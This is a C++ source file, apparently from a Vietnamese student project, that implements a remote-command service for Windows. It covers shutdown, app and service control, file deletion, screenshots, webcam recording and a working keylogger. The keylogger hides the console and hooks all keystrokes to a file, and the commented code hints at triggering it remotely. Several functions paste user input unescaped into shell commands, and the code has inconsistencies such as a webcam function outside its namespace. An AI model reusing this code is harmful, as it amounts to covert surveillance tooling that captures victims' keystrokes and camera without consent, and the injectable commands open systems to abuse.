#include "services.h"

namespace Services {
    std::map<std::string, bool(*)(const std::string&)> servicesMap {
        {"system-shutdown",     &shutdownComputer}, 
        {"system-restart",      &restartComputer},
        {"application-list",    &listApplications},
        {"application-start",   &startApplication},
        {"application-stop",    &stopApplication},
        {"service-list",        &listServices},
        {"service-start",       &startService},
        {"service-stop",        &stopService},
        {"file-delete",         &deleteFile},
        {"screenshot",          &takeScreenShot},
        {"keylogger",           &keyLogger},
        {"webcam-start",        &startWebcam},
        {"webcam-stop",         &stopWebcam}
    };
};

bool Services::shutdownComputer(const std::string &saveFile) {
    std::ofstream fout(saveFile.c_str());
    if (!fout.is_open()) {
        return false;
    }
    fout << "Shutdown operating system success!\n";
    fout.close();
    return system("shutdown /s /f /t 10") == 0;
}

bool Services::restartComputer(const std::string &saveFile) {
    std::ofstream fout(saveFile.c_str());
    if (!fout.is_open()) {
        return false;
    }
    fout << "Restart operating system success!\n";
    fout.close();
    return system("shutdown /r /f /t 10") == 0;
}

std::mutex logMutex;  // Mutex để bảo vệ truy cập tới logData  
std::string logData;

bool Services::SpecialKeys(int S_Key) {
    switch (S_Key)
    {
    case VK_SPACE:
        logData += " ";
        return true;
    case VK_RETURN:
        logData += "\n";
        return true;
    case VK_SHIFT:
        logData += "[SHIFT]";
        return true;
    case VK_BACK:
        logData += "[BACKSPACE]";
        return true;
    case VK_RBUTTON:
        logData += "[R_CLICK]";
        return true;
    case VK_CAPITAL:
        logData += "[CAPS_LOCK]";
        return true;
    case VK_TAB:
        logData += "[TAB]";
        return true;
    case VK_UP:
        logData += "[UP_ARROW]";
        return true;
    case VK_DOWN:
        logData += "[DOWN_ARROW]";
        return true;
    case VK_LEFT:
        logData += "[LEFT_ARROW]";
        return true;
    case VK_RIGHT:
        logData += "[RIGHT_ARROW]";
        return true;
    case VK_CONTROL:
        logData += "[CONTROL]";
        return true;
    case VK_MENU:
        logData += "[ALT]";
        return true;
    // case VK_ESCAPE:
    //     logData += "[ESC]";
    //     return true;
    case VK_HOME:
        logData += "[HOME]";
        return true;
    case VK_END:
        logData += "[END]";
        return true;
    case VK_INSERT:
        logData += "[INSERT]";
        return true;
    case VK_DELETE:
        logData += "[DELETE]";
        return true;
    case VK_PRIOR:
        logData += "[PAGE_UP]";
        return true;
    case VK_NEXT:
        logData += "[PAGE_DOWN]";
        return true;
    case VK_F1:
        logData += "[F1]";
        return true;
    case VK_F2:
        logData += "[F2]";
        return true;
    case VK_F3:
        logData += "[F3]";
        return true;
    case VK_F4:
        logData += "[F4]";
        return true;
    case VK_F5:
        logData += "[F5]";
        return true;
    case VK_F6:
        logData += "[F6]";
        return true;
    case VK_F7:
        logData += "[F7]";
        return true;
    case VK_F8:
        logData += "[F8]";
        return true;
    case VK_F9:
        logData += "[F9]";
        return true;
    case VK_F10:
        logData += "[F10]";
        return true;
    case VK_F11:
        logData += "[F11]";
        return true;
    case VK_F12:
        logData += "[F12]";
        return true;
    case VK_LWIN:
        logData += "[LEFT_WIN]";
        return true;
    case VK_RWIN:
        logData += "[RIGHT_WIN]";
        return true;
    case VK_SNAPSHOT:
        logData += "[PRINT_SCREEN]";
        return true;
    case VK_SCROLL:
        logData += "[SCROLL_LOCK]";
        return true;
    case VK_PAUSE:
        logData += "[PAUSE]";
        return true;

    // Các phím đặc biệt
    case VK_OEM_4:
        logData += "[";
        return true;
    case VK_OEM_6:
        logData += "]";
        return true;
    case VK_OEM_1:
        logData += ";";
        return true;
    case VK_OEM_7:
        logData += "'";
        return true;
    case VK_OEM_COMMA:
        logData += ",";
        return true;
    case VK_OEM_PERIOD:
        logData += ".";
        return true;
    case VK_OEM_2:
        logData += "/";
        return true;
    case VK_OEM_5:
        logData += "\\";
        return true;
    case VK_OEM_MINUS:
        logData += "-";
        return true;
    case VK_OEM_PLUS:
        logData += "=";
        return true;

    // Các phím numpad
    case VK_NUMPAD0:
        logData += "0";
        return true;
    case VK_NUMPAD1:
        logData += "1";
        return true;
    case VK_NUMPAD2:
        logData += "2";
        return true;
    case VK_NUMPAD3:
        logData += "3";
        return true;
    case VK_NUMPAD4:
        logData += "4";
        return true;
    case VK_NUMPAD5:
        logData += "5";
        return true;
    case VK_NUMPAD6:
        logData += "6";
        return true;
    case VK_NUMPAD7:
        logData += "7";
        return true;
    case VK_NUMPAD8:
        logData += "8";
        return true;
    case VK_NUMPAD9:
        logData += "9";
        return true;
    case VK_ADD:
        logData += "+";
        return true;
    case VK_SUBTRACT:
        logData += "-";
        return true;
    case VK_MULTIPLY:
        logData += "*";
        return true;
    case VK_DIVIDE:
        logData += "/";
        return true;
    default:
        return false;
    }
}

// bool Services::keyLogger(const std::string &saveFile) {
//     std::ofstream fout(saveFile.c_str());
//     if (!fout.is_open()) {
//         return false;
//     }

//     ShowWindow(GetConsoleWindow(), SW_HIDE);
//     std::string logData = "";
//     bool flag = 1;
//     // std::string emailBody = getEmail();
//     // if (emailBody == "start keylogger")
//     // {
//     //     ...
//     // }
//     while (flag) {
//         Sleep(10);
//         for (int k = 8; k <= 256; k++) {
//             if (GetAsyncKeyState(k) == -32767) {
//                 if (k == VK_ESCAPE) {
//                     flag = 0;
//                     break;
//                 }
//                 if (!SpecialKeys(k, logData))
//                     logData += char(k);
//             }
//         }
//         if (!logData.empty()) {  
//             fout << logData; 
//             logData.clear();  
//         }  
//     }
    
//     fout.close();
//     return true;
// }

// Hàm hook cho bàn phím  
LRESULT CALLBACK Services::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {  
    if (nCode == HC_ACTION) {  
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;  
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {  
            if (kbd->vkCode == VK_ESCAPE) {  
                return 0;   
            }  

            // Nếu là phím đặc biệt  
            std::lock_guard<std::mutex> guard(logMutex); // Khóa mutex  
            if (!SpecialKeys(kbd->vkCode)) {  
                logData += char(kbd->vkCode); 
            }  
        }  
    }  
    return CallNextHookEx(NULL, nCode, wParam, lParam);  
}  

bool Services::keyLogger(const std::string &saveFile) {  
    std::ofstream fout(saveFile.c_str());  
    if (!fout.is_open()) {  
        return false;  
    }  

    ShowWindow(GetConsoleWindow(), SW_HIDE);  

    // Thiết lập hook bàn phím  
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);  
    if (!hook) {  
        fout.close();  
        return false;  
    }  

    MSG msg;  
    while (true) {  
        {  
            std::lock_guard<std::mutex> guard(logMutex); // Khóa mutex  
            if (!logData.empty()) {  
                fout << logData;  
                logData.clear();  
            }  
        }  
        if (GetAsyncKeyState(VK_ESCAPE)) {  
            break;
        } 
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {  
            TranslateMessage(&msg);  
            DispatchMessage(&msg);  
        }  
    }  

    UnhookWindowsHookEx(hook);  
    fout.close();  
    return true;  
}

bool Services::isSystemApp(const std::string &windowTitle, const std::string &executableName) {
    std::vector<std::string> excludedTitles = {"Settings", "Program Manager", "Windows Input Experience"};
    std::vector<std::string> excludedExecutables = {"SystemSettings.exe", "explorer.exe", "TextInputHost.exe", "ApplicationFrameHost.exe"};
    for (const std::string &title : excludedTitles) {
        if (windowTitle.find(title) != std::string::npos)
            return true;
    }
    for (const std::string &exe : excludedExecutables) {
        if (executableName.find(exe) != std::string::npos)
            return true;
    }

    return false;
}

std::string Services::extractAppName(const std::string &path) {
    return std::filesystem::path(path).filename().string();
}

BOOL CALLBACK Services::EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD processID;
    GetWindowThreadProcessId(hwnd, &processID);

    if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0)
    {
        RunningApp app;
        app.processID = processID;

        int length = GetWindowTextLength(hwnd) + 1;
        std::vector<char> title(length);
        GetWindowTextA(hwnd, &title[0], length);
        app.windowTitle = &title[0];

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
        if (hProcess)
        {
            std::vector<char> exeName(MAX_PATH);
            if (GetModuleFileNameExA(hProcess, NULL, &exeName[0], MAX_PATH))
            {
                app.executableName = &exeName[0];
            }
            CloseHandle(hProcess);
        }

        if (!isSystemApp(app.windowTitle, app.executableName))
        {
            std::set<RunningApp> *apps = reinterpret_cast<std::set<RunningApp> *>(lParam);
            apps->insert(app);
        }
    }
    return TRUE;
}

bool Services::listApplications(const std::string &saveFile) {
    std::set<RunningApp> runningApps;
    EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&runningApps));

    std::ofstream fout(saveFile.c_str());
    if (!fout.is_open()) {
        return false;
    }

    fout << "Cac ung dung dang chay:\n\n";
    for (const auto &app : runningApps) {
        fout << "Process ID: " << app.processID
             << "\nTieu de cua so: " << app.windowTitle
             << "\nTen executable: " << extractAppName(app.executableName)
             << "\nPath: " << app.executableName << "\n\n";
    }

    fout.close();
    return true;
}

bool Services::getApplicationPathFromSearch(const std::string &appName, std::string &appPath) {
    char result[MAX_PATH];

    // Tìm đường dẫn ứng dụng bằng tên thông qua Windows API
    HINSTANCE hFind = FindExecutableA(appName.c_str(), NULL, result);
    if ((hFind != NULL) && (hFind > (HINSTANCE)32)) {
        appPath = result;
        return true;
    }
    return false;
}

// bool Services::startApplication(const std::string &appName) {
//     std::string appPath;

//     // Tìm kiếm ứng dụng bằng tên
//     if (getApplicationPathFromSearch(appName, appPath)) {
//         // Nếu tìm thấy đường dẫn ứng dụng
//         std::string command = "start \"\" \"" + appPath + "\"";
//         std::cout << "Starting application: " << appName << '\n';
//         return system(command.c_str());
//     }
//     else {
//         std::cout << "Application " << appName << " not found" << '\n';
//         return false;
//     }
// }

// namespace fs = std::filesystem;  

// bool Services::getApplicationPathFromSearch(const std::string &appName, std::string &appPath) {  
//     // Nếu bạn không muốn sử dụng FindExecutableA, bạn có thể sử dụng filesystem  
//     for (const auto& dir : {"C:\\Program Files", "C:\\Program Files (x86)", "C:\\Windows\\System32"}) {  
//         for (const auto& entry : fs::directory_iterator(dir)) {  
//             if (entry.path().filename() == appName) {  
//                 appPath = entry.path().string();  
//                 return true;  
//             }  
//         }  
//     }  
//     return false;  
// }  

// bool Services::startApplication(const std::string &appName) {  
//     std::string appPath;  

//     // Tìm kiếm ứng dụng bằng tên  
//     if (getApplicationPathFromSearch(appName, appPath)) {  
//         // Nếu tìm thấy đường dẫn ứng dụng  
//         std::cout << "Starting application: " << appName << '\n';  

//         // Thiết lập cấu trúc STARTUPINFO và PROCESS_INFORMATION  
//         STARTUPINFO si;  
//         PROCESS_INFORMATION pi;  
//         ZeroMemory(&si, sizeof(si));  
//         si.cb = sizeof(si);  
//         ZeroMemory(&pi, sizeof(pi));  

//         // Tạo tiến trình  
//         if (!CreateProcess(appPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {  
//             std::cerr << "CreateProcess failed: " << GetLastError() << '\n';  
//             return false;  
//         }  

//         // Đợi cho tiến trình hoàn thành (tuỳ chọn)  
//         // WaitForSingleObject(pi.hProcess, INFINITE);  

//         // Đóng handle vì chúng ta không sử dụng nữa  
//         CloseHandle(pi.hProcess);  
//         CloseHandle(pi.hThread);  

//         return true;  
//     } else {  
//         std::cout << "Application " << appName << " not found" << '\n';  
//         return false;  
//     }  
// }

std::string Services::exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr)
        result += buffer.data();
    return result;
}

bool Services::startApplication(const std::string &appName) {
    // get appID
    std::string cmd = "powershell -command \"Get-StartApps | Where-Object { $_.Name -like '*" + appName + "*' }\"";
    std::string appID = exec(cmd.c_str());
    if (appID == "") 
        return false;
    size_t pos1 = 0,
           pos2 = 0;
    
    pos1 = appID.find("AppID");
    for (int i = 0; i < 3; ++i) pos2 = appID.find("\n", pos2) + 1;
    pos1 += pos2 - 1;
    pos2 = appID.find("\n", pos1);
    appID = appID.substr(pos1, pos2 - pos1);
    std::string appPath = "shell:AppsFolder\\" + appID;

    // open app
    system(("start " + appPath).c_str());
    return true;
}

// bool Services::isApplicationRunning(const std::string &appName) {
//     std::string processName = extractAppName(appName);
//     bool isRunning = false;
//     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

//     if (hSnapshot != INVALID_HANDLE_VALUE) {
//         PROCESSENTRY32 pe;
//         pe.dwSize = sizeof(PROCESSENTRY32);

//         if (Process32First(hSnapshot, &pe)) {
//             do {
//                 std::wcout << pe.szExeFile << '\n';
//                 if (strcmp(processName.c_str(), pe.szExeFile) == 0) {
//                     isRunning = true;
//                     break;
//                 }
//             } while (Process32Next(hSnapshot, &pe));
//         }
//         CloseHandle(hSnapshot);
//     }
//     return isRunning;
// }

bool Services::stopApplication(const std::string &appPath) {
    std::string processName = extractAppName(appPath);
    std::cout << "Process name: " << processName << '\n';
    if (isApplicationRunning(processName)) {
        std::string command = "taskkill /IM " + processName + " /F";
        std::cout << "Stopping application: " << appPath << "\n";
        return system(command.c_str());
    }
    else {
        std::cout << "Application is not running: " << appPath << "\n";
        return false;
    }
}

bool Services::listServices(const std::string &saveFile) {
    std::ofstream fout(saveFile.c_str());
    if (!fout.is_open()) {
        return false;
    }

    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (scmHandle == NULL) {
        std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
        return false;
    }

    DWORD bytesNeeded = 0;
    DWORD servicesCount = 0;
    DWORD resumeHandle = 0;

    // Lần đầu gọi EnumServicesStatus để lấy số byte cần thiết
    if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesCount, &resumeHandle))
    {
        DWORD error = GetLastError();
        if (error != ERROR_MORE_DATA) // Chỉ xử lý khi gặp lỗi khác
        {
            std::cerr << "Error calling EnumServicesStatus for size calculation: " << error << std::endl;
            CloseServiceHandle(scmHandle);
            return false;
        }
    }

    // Cấp phát bộ nhớ ban đầu
    LPENUM_SERVICE_STATUS services = NULL;
    services = (LPENUM_SERVICE_STATUS)LocalAlloc(LMEM_ZEROINIT, bytesNeeded);
    if (services == NULL) {
        std::cerr << "Error allocating memory" << std::endl;
        CloseServiceHandle(scmHandle);
        return false;
    }

    // Lần gọi EnumServicesStatus để liệt kê các dịch vụ
    if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
        DWORD error = GetLastError();
        if (error == ERROR_MORE_DATA) {
            // Nếu thiếu bộ nhớ, cấp phát lại mà không in thông báo
            services = (LPENUM_SERVICE_STATUS)LocalReAlloc(services, bytesNeeded, LMEM_ZEROINIT);
            if (services == NULL) {
                std::cerr << "Error reallocating memory" << std::endl;
                CloseServiceHandle(scmHandle);
                return false;
            }

            // Gọi lại EnumServicesStatus
            if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
                std::cerr << "Error enumerating services after reallocating memory: " << GetLastError() << std::endl;
                LocalFree(services);
                CloseServiceHandle(scmHandle);
                return false;
            }
        }
        else {
            std::cerr << "Error enumerating services: " << error << std::endl;
            LocalFree(services);
            CloseServiceHandle(scmHandle);
            return false;
        }
    }

    // Hiển thị tên của các dịch vụ
    for (DWORD i = 0; i < servicesCount; i++) {
        fout << services[i].lpServiceName << std::endl;
    }

    // Giải phóng bộ nhớ và đóng handle của SCM
    LocalFree(services);
    CloseServiceHandle(scmHandle);
    fout.close();

    return true;
}

bool Services::startService(const std::string &serviceName) {
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scmHandle == NULL) {
        std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
        return false;
    }

    // Chuyển std::string sang LPSTR (mảng char) cho API Windows
    SC_HANDLE serviceHandle = OpenServiceA(scmHandle, serviceName.c_str(), SERVICE_START);
    if (serviceHandle == NULL)
    {
        std::cerr << "Error opening service: " << GetLastError() << std::endl;
        CloseServiceHandle(scmHandle);
        return false;
    }

    // Bắt đầu dịch vụ
    if (!StartService(serviceHandle, 0, NULL)) {
        std::cerr << "Error starting service: " << GetLastError() << std::endl;
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        return false;
    }

    std::cout << "Service " << serviceName << " started successfully!" << std::endl;

    // Đóng handle
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);

    return true;
}

bool Services::stopService(const std::string &serviceName) {
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scmHandle == NULL) {
        std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
        return false;
    }

    SC_HANDLE serviceHandle = OpenServiceA(scmHandle, serviceName.c_str(), SERVICE_STOP);
    if (serviceHandle == NULL) {
        DWORD dwError = GetLastError();
        std::cerr << "Error opening service: " << dwError << std::endl;
        if (dwError == ERROR_ACCESS_DENIED) {
            std::cerr << "Access Denied. Try running the program as Administrator." << std::endl;
        }
        CloseServiceHandle(scmHandle);
        return false;
    }

    SERVICE_STATUS status;
    if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
        DWORD dwError = GetLastError();
        std::cerr << "Error stopping service: " << dwError << std::endl;
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        return false;
    }

    std::cout << "Service " << serviceName << " stopped successfully!" << std::endl;

    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);

    return true;
}

bool Services::CaptureScreen(const std::string &filename) {
    // Lấy kích thước màn hình
    UINT dpi = 96;
    HMONITOR hMonitor = MonitorFromWindow(nullptr, MONITOR_DEFAULTTOPRIMARY);
    if (hMonitor)
        GetDpiForMonitor(hMonitor, MDT_EFFECTIVE_DPI, &dpi, &dpi);

    int screenWidth = GetSystemMetricsForDpi(SM_CXSCREEN, dpi);
    int screenHeight = GetSystemMetricsForDpi(SM_CYSCREEN, dpi);

    // Tạo một DC để tương tác với màn hình
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    if (!hMemoryDC)
    {
        std::cerr << "Không thể tạo DC tương thích!" << std::endl;
        ReleaseDC(NULL, hScreenDC);
        return false;
    }

    // Cấu hình cho bitmap với BITMAPINFO
    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = -screenHeight; // Đặt chiều cao âm để lưu ảnh đúng chiều
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    // Tạo một DIB section
    void *pBits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hScreenDC, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);

    if (!hBitmap)
    {
        std::cerr << "Không thể tạo DIB section!" << std::endl;
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }

    // Chọn bitmap vào DC bộ nhớ
    SelectObject(hMemoryDC, hBitmap);

    // Sao chép dữ liệu từ màn hình vào bitmap
    if (!BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY))
    {
        std::cerr << "Không thể sao chép dữ liệu từ màn hình vào bitmap!" << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }

    // Tạo file để lưu bitmap
    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER &bi = bmi.bmiHeader;
    DWORD dwBmpSize = ((screenWidth * bi.biBitCount + 31) / 32) * 4 * screenHeight;
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;

    fileHeader.bfType = 0x4D42; // "BM"
    fileHeader.bfSize = dwFileSize;
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    std::ofstream file(filename, std::ios::out | std::ios::binary);
    if (!file)
    {
        std::cerr << "Không thể tạo file ảnh!" << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }

    // Ghi dữ liệu vào file
    file.write(reinterpret_cast<const char *>(&fileHeader), sizeof(fileHeader));
    file.write(reinterpret_cast<const char *>(&bi), sizeof(bi));
    file.write(reinterpret_cast<const char *>(pBits), dwBmpSize);
    file.close();

    // Giải phóng tài nguyên
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    std::cout << "Chụp màn hình thành công! File lưu tại: " << filename << std::endl;
    return true;
}

bool Services::takeScreenShot(const std::string &filename) {
    SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
    return CaptureScreen(filename);
}

// bool Services::copyFile(const std::string &fileSrc, const std::string &fileDes) {
//     std::string command = "copy " + fileSrc + " " + fileDes;
//     return system(command.c_str()) == 0;
// }

bool Services::deleteFile(const std::string &fileName) {
    std::string command = "del \"" + fileName + "\"";
    return system(command.c_str()) == 0;
}


void clear(IGraphBuilder* &pGraph, ICaptureGraphBuilder2* &pBuilder, IBaseFilter* &pCap, IBaseFilter* &pAVIMux, IMediaControl* &pControl) {
    if (pControl) pControl->Release();
    if (pAVIMux) pAVIMux->Release();
    if (pCap) pCap->Release();
    if (pBuilder) pBuilder->Release();
    if (pGraph) pGraph->Release();
}
bool startWebcam(const std::string &saveFile) {
    // convert string --> wstring
    std::wstring fileName (saveFile.begin(), saveFile.end());

    IGraphBuilder* pGraph = nullptr;
    ICaptureGraphBuilder2* pBuilder = nullptr;
    IBaseFilter* pCap = nullptr;
    IBaseFilter* pAVIMux = nullptr;
    IMediaControl* pControl = nullptr;

    // COM initialization
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::cerr << "Failed to initialize COM library." << std::endl;
        return false;
    }

    // Create Graph Builder
    hr = CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);
    if (FAILED(hr)) {
        std::cerr << "Failed to create GraphBuilder." << std::endl;
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }

    // Create Capture Graph Builder
    hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuilder);
    if (FAILED(hr)) {
        std::cerr << "Failed to create Capture Graph Builder." << std::endl;
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }
    pBuilder->SetFiltergraph(pGraph);

    //
    ICreateDevEnum* pDevEnum = NULL;
    IEnumMoniker* pEnum = NULL;
    IMoniker* pMoniker = NULL;
    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum);
    if (FAILED(hr)) {
        std::cerr << "Failed to create video capture filter." << std::endl;
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }
    hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
    if (hr == S_OK) {
        hr = pEnum->Next(1, &pMoniker, NULL);
        if (hr == S_OK) {
            hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
            pMoniker->Release();
        }
        pEnum->Release();
    }
    pDevEnum->Release();

    // Add Video Capture Filter to Graph
    hr = pGraph->AddFilter(pCap, L"Capture Filter");
    if (FAILED(hr)) {
        std::cerr << "Failed to add video capture filter to graph." << std::endl;
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }

    // Add AVI filter to Graph
    hr = CoCreateInstance(CLSID_AviDest, nullptr, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pAVIMux);
    if (FAILED(hr)) {
        std::cerr << "Failed to create AVI Multiplexer filter!\n";
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }
    hr = pGraph->AddFilter(pAVIMux, L"AVI Mux");
    if (FAILED(hr)) {
        std::cerr << "Failed to add AVI Multiplexer filter to the graph!\n";
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }

    // Save Video to File
    IFileSinkFilter* pSink = nullptr;
    hr = pBuilder->SetOutputFileName(&MEDIASUBTYPE_Avi, fileName.c_str(), &pAVIMux, &pSink);
    if (FAILED(hr)) {
        std::cerr << "Failed to set output file!\n";
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }
    pSink->Release();

    //
    hr = pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, NULL, pAVIMux);
    if (FAILED(hr)) {
        std::cerr << "Failed to render stream for preview." << std::endl;
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }

    //
    hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl);
    if (FAILED(hr)) {
        std::cerr << "Failed to query media control interface." << std::endl;
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }

    // Running
    hr = pControl->Run();
    if (FAILED(hr)) {
        std::cerr << "Failed to run graph." << std::endl;
        clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
        CoUninitialize();
        return false;
    }

    // Set time and Stop
    std::this_thread::sleep_for(std::chrono::seconds(5));
    pControl->Stop();

    // Clear anything
    clear(pGraph, pBuilder, pCap, pAVIMux, pControl);
    CoUninitialize();

    return true;
}

bool Services::stopWebcam(const std::string &saveFile) {
    std::ofstream fout(saveFile.c_str());
    if (!fout.is_open()) {
        return false;
    }
    fout << "Stop webcam success!\n";
    fout.close();
    return system("taskkill /F /IM WindowsCamera.exe") == 0;
}

bool Services::processCommand(std::string &command) {
    int pos = command.find(' ');
    if (pos == command.npos) {
        return false;
    }

    std::string type = command.substr(0, pos);
    std::cout << "Type: " << type << '\n';

    // if (type == "file-copy") {
    //     int pos2 = command.find(' ', pos + 1);
    //     std::string pathSrc = command.substr(pos + 1, pos2 - pos - 1);
    //     std::string pathDes = command.substr(pos2 + 1, command.size() - pos2 - 1);
    //     return copyFile(pathSrc, pathDes);
    // }

    if (servicesMap.find(type) == servicesMap.end()) {
        return false;
    }

    std::string str = command.substr(pos + 1, command.size() - pos - 1);
    std::cout << "File: " << str << '\n';
    return servicesMap[type](str);
}

// int main()
// {
//     int choice;
//     cout << "Select 1 option: " << endl;
//     cout << "\t1. Shutdown" << endl;
//     cout << "\t2. Reset" << endl;
//     cout << "\t3. Keylogger" << endl;
//     cout << "\t4. List of applications" << endl;
//     cout << "\t5. Start application" << endl;
//     cout << "\t6. Stop application" << endl;
//     cout << "\t7. List of services" << endl;
//     cout << "\t8. Start service" << endl;
//     cout << "\t9. Stop service" << endl;
//     cout << "\t10. Screenshot" << endl;
//     cout << "\t11. Copy file" << endl;
//     cout << "\t12. Delete file" << endl;
//     cout << "\t13. Start webcam" << endl;
//     cout << "\t14. Stop webcam" << endl;
//     cout << "\t0. Exit program" << endl;
//     cout << "Enter selection: ";
//     cin >> choice;
//     std::string appName, serviceName, fileName, srcFile, desFile;
//     std::string logData;
//     switch (choice)
//     {
//     case 1:
//         cout << "Shutting down the computer..." << endl;
//         shutdownComputer();
//         break;
//     case 2:
//         cout << "Restarting the computer..." << endl;
//         restartComputer();
//         break;
//     case 3:
//         logData = keyLogger();
//         cout << logData;
//         break;
//     case 4:
//         cout << "List of applications:\n";
//         listApplications();
//         break;
//     case 5:
//         cout << "Enter the name of the application to open: ";
//         cin >> appName;
//         startApplication(appName);
//         break;
//     case 6:
//         cout << "Enter the name of the application to stop: ";
//         cin >> appName;
//         stopApplication(appName);
//         break;
//     case 7:
//         listServices();
//         break;
//     case 8:
//         cout << "Enter the name of the service to open: ";
//         cin >> serviceName;
//         startService(serviceName);
//         break;
//     case 9:
//         cout << "Enter the name of the service to stop: ";
//         cin >> serviceName;
//         stopService(serviceName);
//         break;
//     case 10:
//         takeScreenShot();
//         break;
//     case 11:
//         cout << "Enter source file name: ";
//         cin >> srcFile;
//         cout << "Enter destination file name: ";
//         cin >> desFile;
//         copyFile(srcFile, desFile);
//         break;
//     case 12:
//         cout << "Enter file name to delete: ";
//         cin >> fileName;
//         deleteFile(fileName);
//         break;
//     case 13:
//         startWebcam();
//         break;
//     case 14:
//         stopWebcam();
//         break;
//     case 0:
//         cout << "Exit the program" << endl;
//         return 0;
//     default:
//         cout << "Invalid selection!" << endl;
//         break;
//     }
//     return 0;
// }
